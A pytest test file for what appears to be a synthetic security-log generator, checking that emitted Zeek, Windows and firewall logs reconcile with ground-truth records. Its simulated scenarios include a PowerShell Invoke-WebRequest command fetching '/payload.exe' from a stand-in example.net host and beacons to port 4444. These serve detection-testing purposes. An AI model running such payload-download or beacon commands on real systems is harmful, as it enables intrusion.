"""Ground-truth facts must reconcile with independently read emitted evidence."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from evidenceforge.events.ground_truth import GroundTruthDocument
from evidenceforge.events.ground_truth_occurrence import (
    GroundTruthOccurrence,
    read_ground_truth_occurrences,
)
from evidenceforge.generation.engine import GenerationEngine
from evidenceforge.models.scenario import Scenario


def _scenario(
    root: Path,
    events: list[dict],
    *,
    activity: str = "Diagnostic action",
    formats: list[str] | None = None,
) -> Scenario:
    return Scenario.model_validate(
        {
            "version": "1.0",
            "name": "ground-truth-regression",
            "description": "Bounded regression",
            "environment": {
                "description": "Diagnostic workstation",
                "users": [
                    {
                        "username": "alice",
                        "full_name": "Alice Example",
                        "email": "alice@example.org",
                        "primary_system": "WS01",
                    }
                ],
                "systems": [
                    {
                        "hostname": "WS01",
                        "ip": "10.0.10.10",
                        "os": "Windows 11",
                        "type": "workstation",
                        "assigned_user": "alice",
                    }
                ],
                "network": {
                    "segments": [
                        {
                            "name": "clients",
                            "cidr": "10.0.10.0/24",
                            "exposure": "internal",
                            "systems": ["WS01"],
                        }
                    ],
                    "sensors": [
                        {
                            "type": "network",
                            "name": "client-tap",
                            "monitoring_segments": ["clients"],
                            "log_formats": ["zeek"],
                        }
                    ],
                },
            },
            "time_window": {"start": "2024-10-14T10:00:00Z", "duration": "2m"},
            "baseline_activity": {
                "description": "Minimal background",
                "intensity": "low",
                "variation": "low",
                "suspicious_noise": "low",
            },
            "storyline": [
                {
                    "id": "action",
                    "time": "+30s",
                    "actor": "alice",
                    "system": "WS01",
                    "activity": activity,
                    "events": events,
                }
            ],
            "output": {
                "logs": [{"format": value} for value in formats or ["zeek"]],
                "destination": str(root),
                "compression": False,
            },
        }
    )


def _log_rows(root: Path, filename: str) -> list[dict]:
    return [
        json.loads(line)
        for path in root.rglob(filename)
        for line in path.read_text().splitlines()
        if line.strip()
    ]


def _truth(root: Path) -> tuple[GroundTruthDocument, list[GroundTruthOccurrence]]:
    document = GroundTruthDocument.model_validate_json((root / "GROUND_TRUTH.json").read_text())
    assert document.event_stream is not None
    return document, list(read_ground_truth_occurrences(root, document.event_stream))


def _download() -> dict:
    return {
        "type": "connection",
        "dst_ip": "93.184.216.34",
        "hostname": "download-regression.example.net",
        "dst_port": 8080,
        "service": "http",
        "method": "GET",
        "uri": "/payload.exe",
    }


def test_process_download_records_infrastructure_and_dns_use(tmp_path: Path) -> None:
    host = "process-download.example.net"
    scenario = _scenario(
        tmp_path,
        [
            {
                "type": "process",
                "process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "command_line": f'powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri http://{host}:8080/payload.exe"',
            }
        ],
    )
    GenerationEngine(scenario, tmp_path).generate()
    document, occurrences = _truth(tmp_path)
    http = next(row for row in _log_rows(tmp_path, "http.json") if row.get("host") == host)
    conn = next(row for row in _log_rows(tmp_path, "conn.json") if row["uid"] == http["uid"])
    dns = next(row for row in _log_rows(tmp_path, "dns.json") if row.get("query") == host)
    destination = conn["id.resp_h"]
    assert destination in dns["answers"]
    assert http["id.resp_h"] == destination
    assert destination in document.model_dump_json()
    assert destination in (tmp_path / "GROUND_TRUTH.md").read_text()
    consequence = next(
        row
        for row in occurrences
        if isinstance(row.facts.get("http"), dict) and row.facts["http"].get("host") == host
    )
    assert consequence.intent_id == document.events[0].intent_id
    use = next(
        relation for relation in consequence.relationships if relation.kind == "dns_answer_use"
    )
    assert use.facts["answers"] == dns["answers"]
    assert use.facts["selected_ip"] == destination
    assert any(row.kind == "process_create" for row in occurrences)


def test_blocked_description_is_not_asserted_as_prevention(tmp_path: Path) -> None:
    GenerationEngine(
        _scenario(tmp_path, [_download()], activity="Tool download was blocked"), tmp_path
    ).generate()
    document, occurrences = _truth(tmp_path)
    http = next(
        row
        for row in _log_rows(tmp_path, "http.json")
        if row.get("host") == "download-regression.example.net"
    )
    assert http["status_code"] == 200
    actual = next(row for row in occurrences if row.facts.get("http"))
    assert actual.outcome.result == "completed"
    assert document.events[0].attributes.http_statuses == [200]
    markdown = (tmp_path / "GROUND_TRUTH.md").read_text()
    assert "Authored Attack Description" in markdown
    assert "Tool download was blocked" in markdown
    assert "HTTP GET 200" in markdown


@pytest.mark.parametrize("kind", ["connection", "beacon"])
@pytest.mark.parametrize("status", [200, 301, 302, 307, 403, 404])
def test_explicit_public_http_status_survives_site_policy(
    tmp_path: Path, kind: str, status: int
) -> None:
    event = {**_download(), "type": kind, "dst_port": 80, "status_code": status}
    if kind == "beacon":
        event.update(interval="10s", count=1, jitter=0.0)
    GenerationEngine(_scenario(tmp_path, [event]), tmp_path).generate()
    http = [row for row in _log_rows(tmp_path, "http.json") if row.get("host") == event["hostname"]]
    assert http and all(row["status_code"] == status for row in http)
    document, _occurrences = _truth(tmp_path)
    assert document.events[0].attributes.http_statuses == [status]


def test_public_http_default_still_uses_site_redirect(tmp_path: Path) -> None:
    event = {**_download(), "dst_port": 80}
    GenerationEngine(_scenario(tmp_path, [event]), tmp_path).generate()
    http = next(
        row for row in _log_rows(tmp_path, "http.json") if row.get("host") == event["hostname"]
    )
    assert http["status_code"] in {301, 302}


@pytest.mark.parametrize("kind", ["connection", "beacon"])
def test_authored_status_alone_creates_http_context(tmp_path: Path, kind: str) -> None:
    event = {**_download(), "type": kind, "dst_port": 80, "status_code": 403}
    event.pop("method")
    event.pop("uri")
    if kind == "beacon":
        event.update(interval="10s", count=1, jitter=0.0)
    GenerationEngine(_scenario(tmp_path, [event]), tmp_path).generate()
    rows = [row for row in _log_rows(tmp_path, "http.json") if row.get("host") == event["hostname"]]
    assert rows and all(row["status_code"] == 403 for row in rows)


def test_beacon_sequence_preserves_each_authored_status(tmp_path: Path) -> None:
    event = {
        **_download(),
        "type": "beacon",
        "dst_port": 80,
        "count": 3,
        "interval": "5s",
        "jitter": 0.0,
        "http_sequence": [
            {"uri": "/one", "status_code": 403},
            {"uri": "/two", "status_code": 200},
            {"uri": "/three", "status_code": 307},
        ],
    }
    GenerationEngine(_scenario(tmp_path, [event]), tmp_path).generate()
    rows = [row for row in _log_rows(tmp_path, "http.json") if row.get("host") == event["hostname"]]
    assert {row["uri"]: row["status_code"] for row in rows} == {
        "/one": 403,
        "/two": 200,
        "/three": 307,
    }


def test_raw_ip_connection_has_no_invented_dns_relationship(tmp_path: Path) -> None:
    event = {"type": "connection", "dst_ip": "93.184.216.34", "dst_port": 4444, "service": "tcp"}
    GenerationEngine(_scenario(tmp_path, [event]), tmp_path).generate()
    _document, rows = _truth(tmp_path)
    assert not any(row.facts.get("dns") for row in rows)
    assert not any(
        relation.kind == "dns_answer_use" for row in rows for relation in row.relationships
    )


def test_canonical_facts_are_repeatable_and_source_filter_independent(tmp_path: Path) -> None:
    roots = [tmp_path / name for name in ("first", "repeat", "filtered")]
    for root in roots:
        formats = ["ecar"] if root.name == "filtered" else ["zeek"]
        GenerationEngine(_scenario(root, [_download()], formats=formats), root).generate()
    assert (roots[0] / "GROUND_TRUTH_EVENTS.jsonl").read_bytes() == (
        roots[1] / "GROUND_TRUTH_EVENTS.jsonl"
    ).read_bytes()
    first = [
        row.model_dump(
            exclude={"observations", "source_expectations", "coverage_gaps", "source_views"}
        )
        for row in _truth(roots[0])[1]
    ]
    filtered = [
        row.model_dump(
            exclude={"observations", "source_expectations", "coverage_gaps", "source_views"}
        )
        for row in _truth(roots[2])[1]
    ]
    assert first == filtered


def test_v3_ground_truth_remains_readable(tmp_path: Path) -> None:
    GenerationEngine(_scenario(tmp_path, [_download()]), tmp_path).generate()
    document = json.loads((tmp_path / "GROUND_TRUTH.json").read_text())
    document["schema_version"] = 3
    for key in ("event_stream", "intent_outcomes", "background_counts"):
        document.pop(key)
    legacy = GroundTruthDocument.model_validate(document)
    assert legacy.schema_version == 3
    from evidenceforge.evaluation.context import EvaluationContext
    from evidenceforge.evaluation.pillars.causality import CausalityScorer

    score = CausalityScorer._score_intent_reconciliation(
        _scenario(tmp_path, [_download()]),
        EvaluationContext(ground_truth=legacy, ground_truth_root=tmp_path),
    )
    assert score.score == 100.0


@pytest.mark.parametrize("absence", ["no_sensor", "collection_loss"])
def test_missing_observation_keeps_occurrence_and_specific_reason(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    absence: str,
) -> None:
    from evidenceforge.events.observation import ObservationDecision, ObservationPolicy

    scenario = _scenario(tmp_path, [_download()])
    if absence == "no_sensor":
        scenario.environment.network.sensors = []
    else:
        monkeypatch.setattr(
            ObservationPolicy,
            "decide_projection",
            lambda *args, **kwargs: ObservationDecision(status="dropped"),
        )
    GenerationEngine(scenario, tmp_path).generate()
    _document, occurrences = _truth(tmp_path)
    http = next(row for row in occurrences if row.facts.get("http"))
    assert http.outcome.result == "completed"
    if absence == "no_sensor":
        assert any(item.reason == "source_not_deployed" for item in http.coverage_gaps)
        assert not http.source_expectations
    else:
        assert any(
            item.expected == "absent" and item.reason == "modeled_collection_loss"
            for item in http.source_expectations
        )
    assert "observations" not in http.model_dump()


def test_canonical_network_reconciliation_rejects_missing_or_changed_evidence(
    tmp_path: Path,
) -> None:
    from evidenceforge.evaluation.engine import EvaluationEngine
    from evidenceforge.evaluation.ground_truth_agreement import evaluate_ground_truth

    scenario = _scenario(tmp_path, [_download()])
    GenerationEngine(scenario, tmp_path).generate()
    document, _occurrences = _truth(tmp_path)
    records, _counts = EvaluationEngine(tmp_path, scenario)._parse_all_logs()
    result, _ = evaluate_ground_truth(tmp_path, document, scenario, records)
    assert result.score == 100, result.findings
    records["zeek_http"][0].fields["status_code"] = 599
    result, _ = evaluate_ground_truth(tmp_path, document, scenario, records)
    assert result.score < 100 and result.findings
    records["zeek_http"] = []
    assert evaluate_ground_truth(tmp_path, document, scenario, records)[0].incorrect


def test_canonical_process_reconciliation_covers_native_endpoint_consequences(
    tmp_path: Path,
) -> None:
    from evidenceforge.evaluation.engine import EvaluationEngine
    from evidenceforge.evaluation.ground_truth_agreement import evaluate_ground_truth

    scenario = _scenario(
        tmp_path,
        [
            {
                "type": "process",
                "process_name": r"C:\Windows\System32\cmd.exe",
                "command_line": "cmd.exe /c echo diagnostic",
            }
        ],
        formats=["ecar", "windows_event_security", "windows_event_sysmon"],
    )
    GenerationEngine(scenario, tmp_path).generate()
    document, _occurrences = _truth(tmp_path)
    records, _counts = EvaluationEngine(tmp_path, scenario)._parse_all_logs()
    result, _ = evaluate_ground_truth(tmp_path, document, scenario, records)
    assert result.score == 100, result.findings
    records["ecar"] = [row for row in records["ecar"] if row.fields.get("object") != "PROCESS"]
    assert evaluate_ground_truth(tmp_path, document, scenario, records)[0].incorrect


def test_canonical_stream_rejects_tampering(tmp_path: Path) -> None:
    GenerationEngine(_scenario(tmp_path, [_download()]), tmp_path).generate()
    document, _occurrences = _truth(tmp_path)
    assert document.event_stream is not None
    path = tmp_path / document.event_stream.path
    lines = path.read_text().splitlines()
    tampered = json.loads(lines[0])
    tampered["facts"]["tampered"] = True
    lines[0] = json.dumps(tampered)
    path.write_text("\n".join(lines) + "\n")
    with pytest.raises(ValueError):
        list(read_ground_truth_occurrences(tmp_path, document.event_stream))


@pytest.mark.parametrize("mode", ["drop", "reject"])
def test_firewall_prevention_respects_source_and_downstream_sensors(
    tmp_path: Path, mode: str
) -> None:
    from evidenceforge.models.scenario import NetworkSegment, NetworkSensor

    event = {
        "type": "beacon",
        "dst_ip": "93.184.216.34",
        "dst_port": 4444,
        "action": "deny",
        "count": 1,
        "interval": "5s",
        "jitter": 0.0,
    }
    scenario = _scenario(tmp_path, [event], formats=["zeek", "cisco_asa"])
    network = scenario.environment.network
    network.segments.append(
        NetworkSegment(name="egress", cidr="93.184.216.0/24", exposure="external")
    )
    network.sensors.extend(
        [
            NetworkSensor(
                type="network",
                name="downstream-tap",
                monitoring_segments=["egress"],
                log_formats=["zeek"],
            ),
            NetworkSensor(
                type="firewall",
                name="firewall",
                drop_mode=mode,
                monitoring_segments=["clients"],
                log_formats=["cisco_asa"],
            ),
        ]
    )
    GenerationEngine(scenario, tmp_path).generate()
    _document, occurrences = _truth(tmp_path)
    attempt = next(row for row in occurrences if row.outcome.mechanism == "firewall_policy")
    assert attempt.outcome.result == "prevented"
    assert attempt.outcome.enforcing_entity == "firewall"
    assert not attempt.facts.get("http")
    assert attempt.facts["network"]["conn_state"] == ("S0" if mode == "drop" else "REJ")
    source_rows = [
        row
        for path in tmp_path.rglob("conn.json")
        if path.parent.name == "client-tap"
        for row in [json.loads(line) for line in path.read_text().splitlines()]
        if row.get("id.resp_h") == "93.184.216.34" and row.get("id.resp_p") == 4444
    ]
    downstream = [
        row
        for path in tmp_path.rglob("conn.json")
        if path.parent.name == "downstream-tap"
        for row in [json.loads(line) for line in path.read_text().splitlines()]
        if row.get("id.resp_h") == "93.184.216.34" and row.get("id.resp_p") == 4444
    ]
    assert source_rows and not downstream
    excluded = next(
        item
        for item in attempt.source_expectations
        if item.source_instance == "zeek:downstream-tap" and item.format == "zeek_conn"
    )
    assert excluded.expected == "absent" and excluded.reason == "prevented_upstream"
    assert any(
        item.source_instance == "zeek:client-tap" and item.expected == "present"
        for item in attempt.source_expectations
    )
    from evidenceforge.evaluation.engine import EvaluationEngine
    from evidenceforge.evaluation.ground_truth_agreement import evaluate_ground_truth

    records, _ = EvaluationEngine(tmp_path, scenario)._parse_all_logs()
    result, _ = evaluate_ground_truth(tmp_path, _document, scenario, records)
    assert result.score == 100, result.findings
